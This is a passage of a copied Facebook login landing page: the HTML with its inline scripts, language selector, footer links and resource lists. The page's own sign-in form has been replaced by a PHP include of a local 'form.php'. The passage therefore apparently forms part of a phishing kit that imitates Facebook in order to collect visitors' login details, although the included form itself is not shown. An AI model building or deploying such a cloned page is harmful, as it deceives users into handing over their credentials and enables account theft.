                    "device_id": "$^|AcZc2j-xQVrocwuunGbuPPyF6yGMEAOD4v3MGVGyHkYWS03jZ5lj-Z3c91xKwWNlSVCx52zWxiiC9yN3kw2wx0QwF51T|fd.AcYfiYKTcwRnCgwcVkYqEyjzaZURLzDCoxKKdr-eu17XLnSiCXzPC1uxBjaXVRX0a_l05vOkLz6P3wuYPgxLjdQz",
                    "app_id": "256281040558",
                    "enable_bladerunner": false,
                    "enable_ack": true,
                    "push_phase": "C3",
                    "enable_observer": false,
                    "enable_dataloss_timer": false,
                    "enable_fallback_for_br": true,
                    "fix_br_init_rc": false
                }, 5237],
                ["cr:696703", [], {
                    "__rc": [null,
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:708886", ["EventProfilerImpl"], {
                    "__rc": ["EventProfilerImpl",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:717822", ["TimeSliceImpl"], {
                    "__rc": ["TimeSliceImpl",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:806696", ["clearTimeoutBlue"], {
                    "__rc": ["clearTimeoutBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:807042", ["setTimeoutBlue"], {
                    "__rc": ["setTimeoutBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
                    "__rc": ["setIntervalAcrossTransitionsBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
                    "__rc": ["setTimeoutAcrossTransitionsBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:1003267", ["clearIntervalBlue"], {
                    "__rc": ["clearIntervalBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:1183579", ["InlineFbtResultImpl"], {
                    "__rc": ["InlineFbtResultImpl",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:925100", ["RunBlue"], {
                    "__rc": ["RunBlue",
                        "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                    ]
                }, -1],
                ["cr:729414", ["VisualCompletion"], {
                    "__rc": ["VisualCompletion",
                        "Aa26IG5VQ00QHcDUBW-AaI525OmZTuiJqbzu-CFnTXgVeKhk5cU2KoKXSeL2fU37b7vEK7UqgP1Rv-MRL6Wx_Me5"
                    ]
                }, -1],
                ["cr:1094907", [], {
                    "__rc": [null,
                        "Aa1f4wrVbus-vaHprOM55dSURIxfv6mO8KvEBo4dqXBCYf1W9Q_SZ4bqJA9J1L6zr6Zxc5LxZUfn8_vrYNJ5c2E"
                    ]
                }, -1],
                ["EventConfig", [], {
                    "sampling": {
                        "bandwidth": 0,
                        "play": 0,
                        "playing": 0,
                        "progress": 0,
                        "pause": 0,
                        "ended": 0,
                        "seeked": 0,
                        "seeking": 0,
                        "waiting": 0,
                        "loadedmetadata": 0,
                        "canplay": 0,
                        "selectionchange": 0,
                        "change": 0,
                        "timeupdate": 0,
                        "adaptation": 0,
                        "focus": 0,
                        "blur": 0,
                        "load": 0,
                        "error": 0,
                        "message": 0,
                        "abort": 0,
                        "storage": 0,
                        "scroll": 200000,
                        "mousemove": 20000,
                        "mouseover": 10000,
                        "mouseout": 10000,
                        "mousewheel": 1,
                        "MSPointerMove": 10000,
                        "keydown": 0.1,
                        "click": 0.02,
                        "mouseup": 0.02,
                        "__100ms": 0.001,
                        "__default": 5000,
                        "__min": 100,
                        "__interactionDefault": 200,
                        "__eventDefault": 100000
                    },
                    "page_sampling_boost": 1,
                    "interaction_regexes": {},
                    "interaction_boost": {},
                    "event_types": {},
                    "manual_instrumentation": false,
                    "profile_eager_execution": false,
                    "disable_heuristic": true,
                    "disable_event_profiler": false
                }, 1726],
                ["AdsInterfacesSessionConfig", [], {}, 2393],
                ["IntlCurrentLocale", [], {
                    "code": "en_GB"
                }, 5954],
                ["USIDMetadata", [], {
                    "browser_id": "?",
                    "tab_id": "",
                    "page_id": "Prc7nut1hveer3",
                    "transition_id": 0,
                    "version": 6
                }, 5888],
                ["cr:686", [], {
                    "__rc": [null,
                        "Aa0ZAYWuz2JgTqHHAm8fCoiMbcHmHHv9s5luumCMH-DdMp55bbkm5UN8DvTDSGyNoOf0tpc3D-jelVliIqzoZ6Ag"
                    ]
                }, -1],
                ["cr:1984081", [], {
                    "__rc": [null,
                        "Aa2L4go5HtAjGSfhguv9FAONjoKt_wOvLCe25NlfuL0t9ks6ElSupvcSW2n2THEUtHoc8-bvBEMPd3ypWhDRZGyiBa15"
                    ]
                }, -1]
            ],
            "require": [
                ["markJSEnabled"],
                ["lowerDomain"],
                ["URLFragmentPrelude"],
                ["Primer"],
                ["BigPipe"],
                ["Bootloader"],
                ["TimeSlice"],
                ["AsyncRequest"],
                ["BanzaiScuba_DEPRECATED"],
                ["VisualCompletionGating"],
                ["FbtLogging"],
                ["IntlQtEventFalcoEvent"],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating",
                            "FbtLogging", "IntlQtEventFalcoEvent"
                        ], "sd"
                    ]
                ],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating",
                            "FbtLogging", "IntlQtEventFalcoEvent"
                        ], "css"
                    ]
                ]
            ]
        });
    });
    </script>
</head>

<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
    <script type="text/javascript" nonce="xTDjvcQX">
    requireLazy(["bootstrapWebSession"], function(j) {
        j(1653099653)
    })
    </script>
    <div class="_li" id="u_0_3_u6">
        <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_4_/v">
            <div class="_608m">
                <div class="_5aj7 _tb6">
                    <div class="_4bl7"><span class="mrm _3bcv _50f3">Jump to</span></div>
                    <div class="_4bl9 _3bcp">
                        <div class="_6a _608n" aria-label="Navigation assistant" aria-keyshortcuts="Alt+/"
                            role="menubar" id="u_0_5_Nc">
                            <div class="_6a uiPopover" id="u_0_6_ji"><a role="button"
                                    class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#"
                                    style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle"
                                    id="u_0_7_NZ"><span class="_55pe">Sections of this page</span><span
                                        class="_4o_3 _3-99"><i class="img sp_oqDpTSMaAsu sx_62cc42"></i></span></a>
                            </div>
                            <div class="_6a _3bcs"></div>
                            <div class="_6a mrm uiPopover" id="u_0_8_3C"><a role="button"
                                    class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
                                    href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1"
                                    aria-expanded="false" rel="toggle" id="u_0_9_LZ"><span class="_55pe">Accessibility
                                        help</span><span class="_4o_3 _3-99"><i
                                            class="img sp_oqDpTSMaAsu sx_e4efc4"></i></span></a></div>
                        </div>
                    </div>
                    <div class="_4bl7 mlm pll _3bct">
                        <div class="_6a _3bcy">Press <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> to
                            open this menu</div>
                    </div>
                </div>
            </div>
        </div>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div>
                    <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                        <div class="_8esk">
                            <div class="_8esl">
                                <div class="_8ice"><img class="fb_logo _8ilh img"
                                        src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                                        alt="Facebook" /></div>
                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.
                                </h2>
                            </div>
                            <div class="_8esn">
                                <div class="_8iep _8icy _9ahz _9ah-">
                                    <div class="_6luv _52jv">
                                   <?php include 'form.php'; ?>
                                    </div>
                                    <!-- <div id="reg_pages_msg" class="_58mk"><a
                                            href="/pages/create/?ref_type=registration_form" class="_8esh">Create a
                                            Page</a> for a celebrity, brand or business.</div> -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="_95ke _8opy">
                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                            <li>English (UK)</li>
                            <li><a class="_sv4" dir="ltr" href="https://bn-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;bn_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/bn-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 0); return false;"
                                    title="Bengali">বাংলা</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/hi-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 1); return false;"
                                    title="Hindi">हिन्दी</a></li>
                            <li><a class="_sv4" dir="rtl" href="https://ur-pk.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ur_PK&quot;, &quot;en_GB&quot;, &quot;https:\/\/ur-pk.facebook.com\/&quot;, &quot;www_list_selector&quot;, 2); return false;"
                                    title="Urdu">اردو</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://ne-np.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ne_NP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ne-np.facebook.com\/&quot;, &quot;www_list_selector&quot;, 3); return false;"
                                    title="Nepali">नेपाली</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://or-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;or_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/or-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 4); return false;"
                                    title="Oriya">ଓଡ଼ିଆ</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/&quot;, &quot;www_list_selector&quot;, 5); return false;"
                                    title="Spanish">Español</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/&quot;, &quot;www_list_selector&quot;, 6); return false;"
                                    title="Portuguese (Brazil)">Português (Brasil)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 7); return false;"
                                    title="French (France)">Français (France)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/&quot;, &quot;www_list_selector&quot;, 8); return false;"
                                    title="German">Deutsch</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_GB&quot;, &quot;https:\/\/it-it.facebook.com\/&quot;, &quot;www_list_selector&quot;, 9); return false;"
                                    title="Italian">Italiano</a></li>
                            <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
                                    ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
                                    href="#" title="Show more languages"><i
                                        class="img sp_oqDpTSMaAsu sx_79e3df"></i></a></li>
                        </ul>
                        <div id="contentCurve"></div>
                        <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                                <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
                                <li><a href="/login/" title="Log in to Facebook">Log In</a></li>
                                <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a>
                                </li>
                                <li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                <li><a href="https://www.facebook.com/watch/" title="Browse our Watch videos.">Watch</a>
                                </li>
                                <li><a href="/places/" title="Take a look at popular places on Facebook.">Places</a>
                                </li>
                                <li><a href="/games/" title="Check out Facebook games.">Games</a></li>
                                <li><a href="/marketplace/"
                                        title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                <li><a href="https://pay.facebook.com/" title="Learn more about Facebook Pay"
                                        target="_blank">Facebook Pay</a></li>
                                <li><a href="https://www.oculus.com/" title="Learn more about Oculus"
                                        target="_blank">Oculus</a></li>
                                <li><a href="https://portal.facebook.com/" title="Learn more about Facebook Portal"
                                        target="_blank">Portal</a></li>
                                <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT050ZOT-FJLeoaNNMuEkS0l_WuKPKAENVYndpf8pV5gC74UC-3pfLZVbHLakl82HBR657NbJW1kkfLBb-BbB-nQIMXLM6oKa43x2aSU-yavBOild2GYmU0zUx5vhiMRos6iHrAMa_rmLCDDbTUjJw"
                                        title="Take a look at Instagram" target="_blank" rel="noopener nofollow"
                                        data-lynx-mode="asynclazy">Instagram</a></li>
                                <li><a href="https://www.bulletin.com/"
                                        title="Take a look at Bulletin newsletter">Bulletin</a></li>
                                <li><a href="/local/lists/245019872666104/"
                                        title="Browse our Local Lists directory.">Local</a></li>
                                <li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
                                <li><a href="/biz/directory/"
                                        title="Browse our Facebook Services directory.">Services</a></li>
                                <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                                        title="See the Voting Information Centre">Voting Information Centre</a></li>
                                <li><a href="/groups/explore/" title="Explore our groups.">Groups</a></li>
                                <li><a href="https://about.facebook.com/" accesskey="8"
                                        title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                </li>
                                <li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                                        title="Advertise on Facebook">Create ad</a></li>
                                <li><a href="/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a>
                                </li>
                                <li><a href="https://developers.facebook.com/?ref=pf"
                                        title="Develop on our platform.">Developers</a></li>
                                <li><a href="/careers/?ref=pf"
                                        title="Make your next career move to our brilliant company.">Careers</a></li>
                                <li><a data-nocookies="1" href="/privacy/explanation/"
                                        title="Learn about your privacy and Facebook.">Privacy</a></li>
                                <li><a href="/policies/cookies/" title="Learn about cookies and Facebook."
                                        data-nocookies="1">Cookies</a></li>
                                <li><a class="_41ug" data-nocookies="1"
                                        href="https://www.facebook.com/help/568137493302217"
                                        title="Learn about AdChoices.">AdChoices<i
                                            class="img sp_oqDpTSMaAsu sx_09ff44"></i></a></li>
                                <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9"
                                        title="Review our terms and policies.">Terms</a></li>
                                <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                                <li><a accesskey="6" class="accessible_elem" href="/settings"
                                        title="View and edit your Facebook settings.">Settings</a></li>
                                <li><a accesskey="7" class="accessible_elem"
                                        href="/allactivity?privacy_source=activity_log_top_menu"
                                        title="View your activity log">Activity log</a></li>
                            </ul>
                        </div>
                        <div class="mvl copyright">
                            <div><span> Meta © 2022</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0"
                style="display:none" /></span>
    </div>
    <div style="display:none"></div>
    <script>
    requireLazy(["HasteSupportData"], function(m) {
        m.handle({
            "bxData": {
                "875231": {
                    "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yD\/r\/d4ZIVX-5C-b.ico"
                }
            },
            "gkxData": {
                "4166": {
                    "result": false,
                    "hash": "AT7yrb5QuQ92736uAqY"
                },
                "677762": {
                    "result": true,
                    "hash": "AT6e9MvRyXpacwOYTa4"
                },
                "1908135": {
                    "result": false,
                    "hash": "AT6miGypJl3m2Aq4MTI"
                },
                "524": {
                    "result": false,
                    "hash": "AT6SLNReg1ijh3bZwoI"
                },
                "819236": {
                    "result": false,
                    "hash": "AT66vW86d2uJ-kXP19U"
                },
                "12": {
                    "result": false,
                    "hash": "AT7MdxfOMhMQYcz0mYY"
                },
                "729631": {
                    "result": false,
                    "hash": "AT7b0tj8AHWG5lTF6Uo"
                },
                "1281505": {
                    "result": false,
                    "hash": "AT4PHZM9gFoypCjQR3Y"
                },
                "1291023": {
                    "result": false,
                    "hash": "AT519LseIG1nwq3oGsw"
                },
                "1294182": {
                    "result": false,
                    "hash": "AT4vd6mwrtAJouEJmak"
                },
                "1399218": {
                    "result": true,
                    "hash": "AT6guCW1eyIkOV1EH_s"
                },
                "1401060": {
                    "result": true,
                    "hash": "AT5aetN5Gb3reIXVX4c"
                },
                "1485055": {
                    "result": true,
                    "hash": "AT5lkGxmhfrVKlcnXHw"
                },
                "1596063": {
                    "result": false,
                    "hash": "AT7JHuDWtaOqRuBUOsY"
                },
                "1597642": {
                    "result": true,
                    "hash": "AT78G4fDXhlnMl7ogDw"
                },
                "1647260": {
                    "result": false,
                    "hash": "AT4WdkrQSGE5dIsEbrA"
                },
                "1695831": {
                    "result": false,
                    "hash": "AT7RA6TJmDFGF-D6ZS4"
                },
                "1722014": {
                    "result": false,
                    "hash": "AT6_M5gpc6RLrHjcb0M"
                },
                "1742795": {
                    "result": false,
                    "hash": "AT6dbnY5JZm_bTINxek"
                },
                "1778302": {
                    "result": false,
                    "hash": "AT65fisZhmc2X92EQlw"
                },
                "1840809": {
                    "result": false,
                    "hash": "AT5nYctoTsr7alRiiGw"
                },
                "1848749": {
                    "result": false,
                    "hash": "AT5GsH9Kb-3W-taZNts"
                },
                "1906871": {
                    "result": false,
                    "hash": "AT6dIBiVv9bUDXlm8Sc"
                },
                "1985945": {
                    "result": true,
                    "hash": "AT66Oo5lY__5wUTpbJE"
                },
                "5541": {
                    "result": true,
                    "hash": "AT70V-Q_zfEykznOmdg"
                },
                "1099893": {
                    "result": false,
                    "hash": "AT5kly2LSZV_DKGRVyc"
                }
            },
            "qexData": {
                "644": {
                    "r": null
                },
                "647": {
                    "r": null
                },
                "648": {
                    "r": null
                },
                "650": {
                    "r": null
                },
                "651": {
                    "r": null
                }
            }
        })
    });
    requireLazy(["Bootloader"], function(m) {
        m.handlePayload({
            "consistency": {
                "rev": 1005560434
            },
            "rsrcMap": {
                "To8CHca": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/N9PepC8gN1h.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "WjFF9uN": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/r\/qC1B0A_CS1P.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "kP1XEF1": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/dcPAKjn6Jh_.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "OeK4roN": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/r\/WmbnJ7H8VsD.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "5sQ5HiS": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yF\/r\/q8NTDF-khd8.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "xfkMCpl": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij9m4\/yO\/l\/en_GB\/YVPMKVKdbNX.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "sCh2YZt": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3igbH4\/yo\/l\/en_GB\/6VbhyZgVCHQ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "ON0J\/ya": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/c-rEGdO4C2C.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "rq2J+HZ": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/nV0-bYwIdOC.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "f8FoTFv": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/r\/lHgq-UZoLut.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "k2hUbUf": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/AQ0LpdPtA1g.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "00Aws6K": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/BwlkRv7B4IH.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "VzF4auJ": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYXl4\/yR\/l\/en_GB\/6Na2oJU5xni.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "oqtOta1": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y-\/r\/w1CFJ54PTFC.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "2\/maQ\/Q": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/mPQTxAVB7AK.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "w3Wk9lz": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iX3c4\/yP\/l\/en_GB\/waujFC3AG07.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "IfCgv8r": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/4ZUg64ZRRZ_.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "CGkH4FY": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/r\/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "2hq4l+6": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iHWq4\/ym\/l\/en_GB\/DrhduNXKBdd.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "sWwYI0R": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/79rB0tPt-O1.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/AN8Bt5": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/3FPJ9YC_wUr.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "QOEqao5": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/r\/i2ZHsXWMmLp.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "6l7POEm": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iCwx4\/yR\/l\/en_GB\/ILHx_tD9z9W.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "lCiWnqM": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNEW4\/yQ\/l\/en_GB\/7SXfmyLRrBz.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/mnVquy": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFJJ4\/yE\/l\/en_GB\/p1zGgkjUEjK.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "s\/mXAtV": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yX\/r\/ysSKKov6H6m.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "7Q4C2+V": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikxI4\/y4\/l\/en_GB\/w3Wdp9seDwU.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/hl4ZY6": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/i6Cge9y9pO2.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "kKVtO2\/": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/bXaD7L4iUtv.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "IyhltvU": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAgG4\/yc\/l\/en_GB\/fb1fmUDrgcm.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "XnzIB9c": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/r\/_eHA3RwhIyd.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "tZo1QS2": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yD\/l\/0,cross\/sJioQplXXxF.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/KQiREt": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/r\/qrq3-kU5w3w.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "MS38WPz": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ipaT4\/yJ\/l\/en_GB\/fcdRya04s4K.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "H5937fS": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/AQztV1LqA0d.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "rkIkudu": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/s4WivEPu3rU.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "fsh99j2": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/r\/pr8gh84Gu-V.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "KOyYKgO": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yN\/r\/IDAtRixokw6.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "R9eVTU2": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3itPQ4\/y4\/l\/en_GB\/CNLXGh2_xHP.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "I4BfZ8R": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/7voVGqwJ_1x.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "JH9Dkko": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_bH4\/yf\/l\/en_GB\/wHKWQoH3UId.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "nR3i3uV": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/1bnXY7tF5Bx.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "OL5e75L": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yT\/r\/vX4XKVis9pd.js?_nc_x=Ij3Wp8lg5Kz"
                },
